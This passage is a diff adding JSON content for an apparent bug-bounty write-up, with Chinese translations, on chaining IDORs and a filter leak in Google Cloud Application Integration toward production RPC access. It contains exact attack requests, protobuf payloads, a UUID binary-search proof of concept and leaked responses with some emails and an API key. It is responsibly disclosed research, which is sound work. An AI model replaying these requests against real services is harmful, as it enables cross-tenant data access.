+            "text": "GET /v1/projects/<your-project>/locations/us-central1/integrations/anythinghere/versions/<victim-uuid> HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>"
+          },
+          {
+            "type": "p",
+            "text": "and the API would happily return the victim's resource, because the authentication check was done on your project ID (you are authorized for your own project), but there was no access control check if the ID was actually tied to your project or not."
+          },
+          {
+            "type": "p",
+            "text": "However, this by itself wouldn't be too impactful, because these are UUIDv4. The search space is far too large to be meaningfully bruteforce-able (search space of 10^36). Hence, I went looking around for any way I could potentially leak a victim's resource UUIDs."
+          },
+          {
+            "type": "p",
+            "text": "That's when I noticed this interesting \"test cases\" feature. From the documentation:"
+          },
+          {
+            "type": "quote",
+            "text": "With Application Integration, you can create and run multiple test cases on your complex integrations that connect and manage Google Cloud services and other business applications. By testing your integration flow, you can ensure that your integration is working as intended."
+          },
+          {
+            "type": "p",
+            "text": "The interesting thing was, when you look at how your test cases are loaded in the frontend, the browser sends a request like so:"
+          },
+          {
+            "type": "code",
+            "text": "POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2\nHost: us-central1-integrations.clients6.google.com\nContent-Type: application/x-protobuf\n\n< RAW PROTOBUF DATA >"
+          },
+          {
+            "type": "p",
+            "text": "The actual request payload is in protobuf, I've decoded here so you can see how it looks like:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"1\": \"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4\",\n  \"2\": \"workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4\",\n  \"6\": {\n    \"1\": [\"name\", \"display_name\", \"update_time\", \"client_id\"]\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "Field 1 is the parent resource (my project, my version UUID), field 6 is the response field mask, and field 2, workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4 seemed to be some sort of filter. Perhaps if this was omitted, it would return test cases for all workflows? Surely not..."
+          },
+          {
+            "type": "p",
+            "text": "Dropping field 2 and 6 from the request:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"1\": \"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4\"\n}"
+          },
+          {
+            "type": "p",
+            "text": "...the response came back with test cases from every other GCP project:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"testCases\": [\n    {\n      \"name\": \"projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3\",\n      \"displayName\": \"test\",\n      \"triggerId\": \"api_trigger/AI_bebbia_CreateWOSubs_API_1\",\n      \"testInputParameters\": [\n        {\n          \"key\": \"InputData\",\n          \"dataType\": \"JSON_VALUE\",\n          \"defaultValue\": {\n            \"jsonValue\": \"{\\n  \\\"OldSKU\\\": \\\"300465\\\",\\n  \\\"orderid\\\": \\\"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\\\",\\n  ...\\n}\"\n          },\n          \"displayName\": \"InputData\"\n        }\n      ],\n      \"creatorEmail\": \"redacted@google.com\",\n      ...\n    }\n  ]\n}"
+          },
+          {
+            "type": "p",
+            "text": "Looking closer at the response though, you may notice something off. The versions/... segment in every result is 631a0566-02fc-4dce-b319-25e2c68168f4. That's my version UUID, the one I sent in field 1. The API was just reflecting it straight back into every test case's name, even though these test cases belong to completely different integrations in different projects."
+          },
+          {
+            "type": "p",
+            "text": "So while I now had every test case ID across every GCP project, along with their integration names and creator emails, the actual victim version UUIDs which I needed to feed into those IDORs from earlier were nowhere in the response."
+          },
+          {
+            "type": "p",
+            "text": "That said, the test case IDs alone were already good for some real impact. Application Integration exposes an :executeTest endpoint that runs a test case by its ID, and it didn't actually need the victim's real version UUID."
+          },
+          {
+            "type": "p",
+            "text": "Request"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>\nContent-Length: 0"
+          },
+          {
+            "type": "p",
+            "text": "Response"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"executionId\": \"5d49abed-7692-47aa-8660-5cdaea92d2af\",\n  \"outputParameters\": {\n    \"output\": 3\n  },\n  \"assertionResults\": [\n    {\n      \"assertion\": {\n        \"assertionStrategy\": \"ASSERT_EQUALS\",\n        \"parameter\": {\n          \"key\": \"output\",\n          \"value\": { \"intValue\": \"3\" }\n        }\n      },\n      \"taskNumber\": \"1\",\n      \"taskName\": \"JsonnetMapperTask\",\n      \"status\": \"SUCCEEDED\"\n    }\n  ],\n  \"testExecutionState\": \"PASSED\"\n}"
+          },
+          {
+            "type": "p",
+            "text": "So I could already trigger arbitrary test cases to execute in any victim's environment, but the real goal was still to access a victim's entire integration through the IDORs from earlier, and for that I needed the actual version UUID."
+          },
+          {
+            "type": "p",
+            "text": "I was stuck here for a bit. That was, until I had an idea. The filter parameter (field 2) clearly supports comparison operators like =. What if it also supports > and <=? If it does, I could anchor on a known test case ID and then binary search the workflow_id field, one hex character at a time, until I'd reconstructed the entire UUID:"
+          },
+          {
+            "type": "code",
+            "text": "id = \"<known-tc-uuid>\" AND workflow_id > \"<low>\" AND workflow_id <= \"<high>\""
+          },
+          {
+            "type": "p",
+            "text": "Each request narrows the range. If the test case still appears in the response, the real workflow_id is in (low, high], otherwise it's outside. A 32-character hex UUID should in theory fall out in around 128 requests."
+          },
+          {
+            "type": "p",
+            "text": "I had Claude write a PoC for this, and it worked perfectly first try:"
+          },
+          {
+            "type": "code",
+            "text": "$ python extract_by_id.py --token \"<redacted>\" --project 273897706296 --location \"us-central1\" --tc-id \"60413427-4d07-4c36-bce0-66cfcdd81879\"\nTest case: 60413427-4d07-4c36-bce0-66cfcdd81879\nParent:    projects/273897706296/locations/us-central1/integrations/x/versions/-\n\nVerified: target found. Starting binary search...\n\n  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)\n  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)\n  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)\n  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)\n  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)\n  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)\n  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)\n  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)\n\nworkflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56\nTotal requests: 128"
+          },
+          {
+            "type": "p",
+            "text": "I now had the victim's actual integration version UUID. Chaining this with the GetIntegrationVersion IDOR:"
+          },
+          {
+            "type": "code",
+            "text": "GET /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>"
+          },
+          {
+            "type": "p",
+            "text": "It returned the full integration belonging to a different project, including every trigger config, task config, parameter binding, and creator email:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"name\": \"projects/<your-project>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56\",\n  \"state\": \"DRAFT\",\n  \"triggerConfigs\": [\n    {\n      \"label\": \"API Trigger\",\n      \"triggerType\": \"API\",\n      \"triggerId\": \"api_trigger/TestCasePOC5_API_1\"\n    }\n  ],\n  \"taskConfigs\": [\n    {\n      \"task\": \"GenericRestV2Task\",\n      \"displayName\": \"Call REST Endpoint\",\n      \"parameters\": {\n        \"url\": { \"key\": \"url\", \"value\": { \"stringValue\": \"$url$\" } },\n        \"httpMethod\": { \"key\": \"httpMethod\", \"value\": { \"stringValue\": \"POST\" } },\n        \"authConfigName\": { \"key\": \"authConfigName\", \"value\": { \"stringValue\": \"authprofiletest\" } }\n      }\n    }\n  ],\n  ...\n  \"integrationParameters\": [\n    { \"key\": \"url\", \"dataType\": \"STRING_VALUE\", \"defaultValue\": { \"stringValue\": \"https://example.com\" } }\n  ],\n  \"lastModifierEmail\": \"gvrptest4@gmail.com\",\n  \"createTime\": \"2026-03-22T11:10:30.087Z\"\n}"
+          },
+          {
+            "type": "p",
+            "text": "If you remember from the original test cases dump, a fair number of those creatorEmail fields ended in @google.com. So there are plenty of internal Google teams running their own integrations on this platform. My obvious next thought was what if some of these Googler integrations already have GenericStubbyTypedTaskV2 (or other internal-only tasks like PythonTask, CreateBuganizerIssueTask, etc.) configured? Any one of those would extend this cross-tenant chain into something significantly worse."
+          },
+          {
+            "type": "p",
+            "text": "I couldn't actually check though. Doing so would mean iterating over real customer data which would break the Google VRP rules, so I bundled up everything I had and sent the report off to Cloud VRP."
+          },
+          {
+            "type": "h3",
+            "text": "Configuring internal task types"
+          },
+          {
+            "type": "p",
+            "text": "This made me think though, what exactly was stopping me from creating my own integration with an internal task type?"
+          },
+          {
+            "type": "p",
+            "text": "If I tried to create an internal task:"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions HTTP/2\nHost: integrations.googleapis.com\nAuthorization: Bearer <redacted>\nContent-Length: 1033\n\n{\n  \"taskConfigsInternal\": [\n    {\n      \"taskNumber\": \"1\",\n      \"taskName\": \"PythonTask\",\n      ...\n      \"taskEntity\": {\n        \"uiConfig\": {\n          \"taskUiModuleConfigs\": [\n            {\n              \"moduleId\": \"RPC_TYPED\"\n            }\n          ]\n        }\n      },\n      \"taskType\": \"ASIS_TEMPLATE\",\n      \"parameters\": {\n        \"TEST\": {\n          \"key\": \"test\",\n          \"value\": {\n            \"stringValue\": \"test\"\n          }\n        }\n      }\n    }\n  ],\n  ...\n}"
+          },
+          {
+            "type": "p",
+            "text": "It would actually work:"
+          },
+          {
+            "type": "code",
+            "text": "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{\n  \"name\": \"projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a\",\n  \"origin\": \"UI\",\n  \"snapshotNumber\": \"1\",\n  \"updateTime\": \"2026-05-01T07:30:07.182512Z\",\n  \"lockHolder\": \"gvrptest4@gmail.com\",\n  \"createTime\": \"2026-05-01T07:30:07.182512Z\",\n  \"lastModifierEmail\": \"gvrptest4@gmail.com\",\n  \"state\": \"DRAFT\",\n  ...\n}"
+          },
+          {
+            "type": "p",
+            "text": "But when I tried to actually execute the workflow, it would just time out with the following error:"
+          },
+          {
+            "type": "code",
+            "text": " Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution and 10min for async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please try to break down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT'' "
+          },
+          {
+            "type": "p",
+            "text": "However, I noticed something peculiar. When I configured the PythonTask (one of the internal tasks), created a test case and executed the test case, instead of timing out, I got this suspicious error on the frontend:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"1\": 9,\n  \"2\": \"java.io.IOException: No space left on device\"\n}"
+          },
+          {
+            "type": "p",
+            "text": "That's a real exception from the execution backend, not a timeout. Whatever code path the test case feature was running on, it was happily reaching deep enough to fail on actual disk I/O. Trying the same trick with GenericStubbyTypedTaskV2 got me a less informative but equally suspicious response:"
+          },
+          {
+            "type": "code",
+            "text": "Failed to execute test case. Error: Unknown Error."
+          },
+          {
+            "type": "p",
+            "text": "I checked the workflow execution logs, and that's when the actual error showed up:"
+          },
+          {
+            "type": "code",
+            "text": "{ \"message\": \"com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w \", \"code\": 500 }"
+          },
+          {
+            "type": "p",
+            "text": "This is extremely suspicious. I was definitely onto something. By hitting:"
+          },
+          {
+            "type": "code",
+            "text": "GET /v1/projects/<project>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download\nHost: integrations.googleapis.com"
+          },
+          {
+            "type": "p",
+            "text": "It was possible to pull the entire stack trace:"
+          },
+          {
+            "type": "code",
+            "text": "com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/> APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725)\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)\n\tat app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)\n\tat /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)\n  ..."
+          },
+          {
+            "type": "p",
+            "text": "This made it clear that our variables were being plugged straight into an ExecuteStubbyCallRequest on the backend. Based on the stack traces from playing around with parameter values, I'd guess the backend code looks roughly like:"
+          },
+          {
+            "type": "code",
+            "text": "GenericStubbyTypedTaskV2.buildRequest():\n    line 219: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:1123\n    line 220: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:1219\n    line 221: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:1313\n    ..."
+          },
+          {
+            "type": "p",
+            "text": "So maybe there was some parameter I had to supply to get this working? The problem was the stack traces only helped me leak the three known parameters, serverSpec, serviceName, and serviceMethod but I wasn't able to find more from this method. Also, Google treats these RCE escalations as security incidents, so before going any further I asked Google's security team for the green light. They got back to me quickly and confirmed that this was exploitable and that I should stop further testing."
+          },
+          {
+            "type": "p",
+            "text": "The report was quickly escalated to P0/S0 and got a 🎉Nice catch!. Almost a month later, the report was awarded $75,000 under \"Compromise of Google Cloud Production Environment\", my highest single bounty to-date."
+          },
+          {
+            "type": "p",
+            "text": "From what I'd gathered from speaking to some Googlers, there are roughly three tiers for base RCE payouts under the Cloud VRP table:"
+          },
+          {
+            "type": "li",
+            "text": "$50k: Relatively unprivileged production user access"
+          },
+          {
+            "type": "li",
+            "text": "$75k: Privileged production user access"
+          },
+          {
+            "type": "li",
+            "text": "$100k: Admin in Google Cloud"
+          },
+          {
+            "type": "p",
+            "text": "Where any given RCE actually lands on this scale depends entirely on how much of the production environment the compromised prod identity can reach directly. Obviously, given the vast attack surface accessible from production access, it's very likely possible to escalate privileges from any sort of initial access."
+          },
+          {
+            "type": "p",
+            "text": "Google was oddly vague about the exact reasoning here, but it seemed that the internal team's own investigation of this chain surfaced significantly more impact in prod than even what I had shown, which is what landed it at the $75k tier."
+          },
+          {
+            "type": "h3",
+            "text": "Timeline (2nd RCE)"
+          },
+          {
+            "type": "li",
+            "text": "2026-03-21 - Initial report sent to Google"
+          },
+          {
+            "type": "li",
+            "text": "2026-03-23 - Google triaged report as P1/S1"
+          },
+          {
+            "type": "li",
+            "text": "2026-03-23 - Informed Google's security team about the RCE escalation"
+          },
+          {
+            "type": "li",
+            "text": "2026-03-23 - 🎉 Nice catch!, report updated to P0/S0"
+          },
+          {
+            "type": "li",
+            "text": "2026-04-28 - Panel awards $75,000. Rationale for this decision: Vulnerability category is \"Compromise of Google Cloud Production Environment\". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products."
+          },
+          {
+            "type": "li",
+            "text": "2026-05-06 - Informed Google that GetIntegrationVersion RPC was still vulnerable"
+          },
+          {
+            "type": "li",
+            "text": "2026-05-08 - Panel awards additional $13,337. Rationale for this decision: Vulnerability category is \"Single-Service Privilege Escalation - WRITE\". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products."
+          }
+        ],
+        "translations": [
+          "最初始于调试端点的信息泄露问题，最终演变为 Google Cloud 生产环境中的完整远程代码执行。三个月后，该漏洞再次出现。此漏洞被分配为 CVE-2026-2031。",
+          "故事始于我的自动化模糊测试工具向我发出警报，关于 API cloudcrmipfrontend-pa.googleapis.com，因为它对某些可疑的端点返回了状态码 200。进一步检查发现，该 API 似乎存在多个公共调试端点：",
+          "截图来自我用于测试内部 Google API 的内部 API 探索器工具（基于 discovery document）",
+          "req2proto as a Service™",
+          "部分端点如 GET /v1/integrationPlatform:listServicesByServer 始终返回内部服务器错误。但端点 /v1/integrationPlatform:getProtoDefinition 却能返回 google3（Google 内部源代码 monorepo）中任何 protobuf 消息的 proto 定义，即使对于 YouTube 这类无关服务也是如此。",
+          "请求",
+          "GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE",
+          "对该 API 进行身份验证时，我们使用 Google 专有的第一方认证机制。这需要包含 Google 账户 cookie 头的 Cookie 头，以及使用 SAPISID cookie 和允许的源 https://console.cloud.google.com 计算出的 Authorization 头值。",
+          "响应",
+          "{\n  \"protoDescriptor\": {\n    \"name\": \"InnerTubeContext\",\n    \"field\": [\n      {\n        \"name\": \"client\",\n        \"number\": 1,\n        \"label\": \"LABEL_OPTIONAL\",\n        \"type\": \"TYPE_MESSAGE\",\n        \"typeName\": \".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo\",\n        \"jsonName\": \"client\"\n      },\n      {\n        \"name\": \"user\",\n        \"number\": 3,\n        \"label\": \"LABEL_OPTIONAL\",\n        \"type\": \"TYPE_MESSAGE\",\n        \"typeName\": \".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo\",\n        \"jsonName\": \"user\"\n      },\n...",
+          "这非常关键，因为在 Google，所有内容都基于 proto。所有 API 均通过 protobuf 以 gRPC 服务形式在内部定义，因此这实际上可以暴露任何端点的请求/响应体，对于像 Google 这样的黑盒目标而言，简直就是金矿。",
+          "过去我曾开发过名为 req2proto 的工具来实现这一目的，但该工具仅限于查找请求体的 proto，而非响应体，且默认假设 API 支持 JSPB（application/json+protobuf），而大多数 API 并不支持。我和朋友们开玩笑地称从此端点为“req2proto as a service”，因为它实际上是托管版、功能更强大的工具。",
+          "在进一步探测此端点前，我先检查是否有其他端点会泄露信息。",
+          "泄露内部工作流执行队列",
+          "初始未设置查询参数时，该端点仅返回 INVALID_ARGUMENT 错误。尝试 * 等过滤器也未成功。但根据过往经验，这些过滤参数通常允许符合 https://google.aip.dev/160 的任何筛选操作。",
+          "因此，当我尝试将 filter 设为 client_id>\"123\" 时，得到了有趣的响应：",
+          "{\n  \"error\": {\n    \"code\": 500,\n    \"message\": \"Failed to convert server response to JSON\",\n    \"status\": \"INTERNAL\"\n  }\n}",
+          "看起来它试图给我的响应没有 JSON 映射。但 Google API 支持通过标准 ?alt= 参数更改响应内容类型。例如，?alt=proto 会以 protobuf 格式返回输出。",
+          "唯一问题是由于我们使用 Google 专有第一方认证（Cookie 和 Authorization 头），必须向 hostname cloudcrmipfrontend-pa.clients6.google.com 而非 cloudcrmipfrontend-pa.googleapis.com 发送请求，但 Google 不允许对 *.google.com 的请求返回原始 proto 响应：",
+          "Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com",
+          "庆幸的是有变通方法。可使用头 X-Goog-Encode-Response-If-Executable: base64，此时响应将以 base64 而非二进制数据返回：",
+          "GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nX-Goog-Encode-Response-If-Executable: base64",
+          "API 返回了一个大型 base64 protobuf 响应。利用之前泄露的 proto 定义获取 ListQuotaQueueResponse 的模式后，我成功解码了它，发现这实际上是一种内部工作流执行队列，其中包括从 Spanner 同步数据到 Salesforce 的工作流：",
+          "{\n  \"queue_items\": [\n    {\n      \"queued_request\": {\n        \"queued_request_id\": \"75a885e2-c611-43f7-b4e2-ae0d87bae789\",\n        \"client_id\": \"default\",\n        \"workflow_name\": \"WriteToSfdc\",\n        \"priority\": \"CRITICAL\",\n        \"received_timestamp\": 1763057385562,\n        \"event_execution_info_id\": \"615cd9a9-9c0e-46ec-90df-91ee42ec9c37\"\n      },\n      \"event_execution_info\": {\n        \"client_id\": \"default\",\n        \"workflow_name\": \"WriteToSfdc\",\n        \"trigger_id\": \"api_trigger/WriteToSfdc\",\n        ...\n        \"type_url\": \"type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest\",\n        ...\n        \"sfdc_object\": {\n          \"vector_account\": {\n            \"id\": \"001Kf00000wjeK3IAI\",\n            \"due_diligence__c\": \"Pending\",\n            \"due_diligence_sub_status__c\": \"1. PENDING DD - Initial Submission Review\"\n            ...",
+          "不久后，我提交了这些漏洞的报告。仅仅几小时后，它被标记为 P0/S0 级别，并获得了 🎉 Nice catch！",
+          "进一步升级？",
+          "经过这些事件后，我确信这个 API 中可能还有更多可利用的内容，于是我开始检查所有工作流端点。该 API 似乎与 Google Cloud 的应用集成相关。",
+          "它允许你定义一个“工作流”，并为触发工作流的条件提供 triggerConfig，以及指定要触发的任务的任务配置 taskConfig。最引人注目的是，在查看发现文档时，似乎存在一个叫 GenericStubbyTypedTask 的任务，你可以配置工作流来执行它，这立刻引起了我的警惕。",
+          "\"EnterpriseCrmEventbusProtoTaskUiModuleConfig\": {\n  \"description\": \"Task author would use this type to configure a config module.\",\n  \"id\": \"EnterpriseCrmEventbusProtoTaskUiModuleConfig\",\n  \"properties\": {\n    \"moduleId\": {\n      \"description\": \"ID of the config module.\",\n      \"enum\": [\n        ...\n        \"RPC_TYPED\",\n        ...\n      ],\n      \"enumDescriptions\": [\n        ...\n        \"Configures a GenericStubbyTypedTask.\",\n        ...\n      ],\n    }\n  }\n},",
+          "根据 Google 的 SRE 书：",
+          "Google 的所有服务都使用名为 Stubby 的远程过程调用（RPC）基础设施进行通信；其开源版本是 gRPC。通常，即使需要在本地程序中调用子程序，也会进行 RPC 调用。这样，如果需要更高的模块化程度或服务器代码库增长时，更容易将调用重构到不同的服务器。",
+          "根据我对这一机制的理解，Borg（即 Google 生产环境）遵循一种安全模型，其中每个 borgtask 服务都有其自己的身份标识。当你向 *.googleapis.com 端点发送请求时，前端服务会使用其自身的 prod 服务身份通过 Stubby 调用后端服务，并在安全票据中携带你的最终用户上下文。如果票据中包含你的 Gaia 用户 ID，后端服务将以该用户的身份授权请求。以下是来自 Google API 错误响应的两个泄露的安全票据示例：",
+          "com.google.apps.framework.auth.IamPermissionDeniedException:\n  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'\n  required for action PrivateCatalogV1Beta1-SearchProducts\n  on resource ''.Explanation:",
+          "com.google.apps.framework.auth.IamPermissionDeniedException:\n  IAM authority does not have the permission 'resourcemanager.projects.get'\n  required for action GetServiceAccessStatus\n  on resource 'projects/613988253758'.Explanation:",
+          "在这两种情况下，peer 块显示了 prod 服务身份进行的内部 Stubby 调用。区别在于最终用户上下文：第一个票据是匿名的，而第二个包含 GAIA_MINT 凭证（当你在 Google 中使用 cookie 或 bearer 认证时，会被转换为标准的 UberMint 令牌，其中包含嵌入的 GaiaMint），这意味着后端以该 Gaia 用户身份授权请求。这样，例如对 /ContactsService.ListContacts 的请求只会返回该授权用户的联系人信息。",
+          "如果我们能以集成平台的 prod 服务身份执行任意 Stubby 查询，这将允许我们访问各种 RPC，范围从敏感用户数据到代码执行，具体取决于 prod 用户的权限。因此，Google 认为这大大增加了攻击面，并将其视为 RCE（远程代码执行）。",
+          "通常情况下，即使能在 borglet 中获得代码执行，除非你对本地处理的数据特别感兴趣，否则主要影响实际上是可以通过 Stubby RPC 访问整个生产环境。",
+          "那么，什么决定了从窃取的 Stubby 原始数据中可以调用哪些 RPC？Google 中的每个 Stubby 服务都有一个定义的 RpcSecurityPolicy，其中包含每个方法的允许列表。以下是从 Cloud SQL Speckle Boss 流程中的一个真实示例：",
+          "mapping {\n  rpc_method: \"/SaasActuation.UpdateInstance\"\n  rpc_method: \"/MaintenancePolicyService.CreateMaintenancePolicy\"\n  ...\n  authentication_policy {\n    creds_policy {\n      rules {\n        permissions: \"auth.creds.useProdUserEUC\"\n        action: ALLOW\n        in: \"mdb:zamm-exe-3-cloud-sql--default-policy\"\n        in: \"user:speckle-tool-proxy@prod.google.com\"\n      }\n      rules {\n        permissions: \"auth.creds.useLOAS\"\n        action: ALLOW\n        in: \"allUsers\"\n      }\n    }\n  }\n  authorization_mode: MANUAL_IAM\n  permission_to_check: \"cloudsql.instances.rollout\"\n}",
+          "每个映射块列出了一组 RPC 方法，并声明在何种凭证类型下允许哪些调用者调用它们。根据我的理解，auth.creds.useLOAS 表示“任何 BorgTask 都可以使用其自身的 LOAS 身份调用此方法”，而 auth.creds.useProdUserEUC 表示“仅这些特定的 MDB 组被允许将 Gaia 终端用户身份（即 UberMint 令牌）转发到调用中”。",
+          "LOAS（低开销认证系统）是 Google 的内部身份验证与加密框架，更多信息请参见这篇论文。",
+          "permission_to_check 随后会告诉后端对最终解析出的身份强制执行哪种 IAM 权限。",
+          "即使拥有窃取的 Stubby 原语，你也不能随意调用所有 RPC。你只能访问那些 RpcSecurityPolicy 允许你的对等身份通过的 RPC。尽管如此，这仍然大大增加了可攻击面。",
+          "当我最初尝试创建工作流时，遇到了以下 INVALID_ARGUMENT 错误：",
+          "请求",
+          "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\nContent-Length: 197\n\n{\n  \"workflow\": {\n    \"name\": \"my-new-workflow-test\",\n    \"origin\": \"UI\",\n    \"triggerConfigs\": [],\n    \"taskConfigs\": []\n  },\n  \"isNewWorkflow\": true\n}",
+          "响应",
+          "{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Request contains an invalid argument.\",\n    \"status\": \"INVALID_ARGUMENT\"\n  }\n}",
+          "趣味事实：如果这个请求是从 Google 内部网发送的，它会输出完整的堆栈跟踪，而不是像这样通用的错误信息。",
+          "我怀疑自己可能遗漏了一个必需的参数，可能是 clientId。回忆起之前 listQuotaQueue 响应中泄露的 \"client_id\": \"default\"，我将它设为 clientId，结果成功了：",
+          "请求",
+          "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\nContent-Length: 197\n\n{\n  \"workflow\": {\n    \"name\": \"my-new-workflow-test\",\n    \"origin\": \"UI\",\n    \"clientId\": \"default\",\n    \"triggerConfigs\": [],\n    \"taskConfigs\": []\n  },\n  \"isNewWorkflow\": true\n}",
+          "响应：",
+          "{\n  \"workflow\": {\n    \"workflowId\": \"53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e\",\n    \"name\": \"my-new-workflow-test\",\n    \"origin\": \"UI\",\n    \"creatorEmail\": \"admin@gvrptest.cry.dev\",\n    \"createdTime\": \"2025-12-01T04:19:14.449503Z\",\n    \"lastModifiedTime\": \"2025-12-01T04:19:14.449503Z\",\n    \"status\": \"DRAFT\",\n    \"snapshotNumber\": \"1\",\n    \"tags\": [\n      \"HEAD\"\n    ],\n    \"lockedBy\": \"admin@gvrptest.cry.dev\",\n    \"lockedAtTime\": \"2025-12-01T04:19:14.449503Z\",\n    \"lastModifierEmail\": \"admin@gvrptest.cry.dev\",\n    \"clientId\": \"default\"\n  }\n}",
+          "然而，为了运行工作流，似乎需要先发布它，但这一步卡住了我：",
+          "请求",
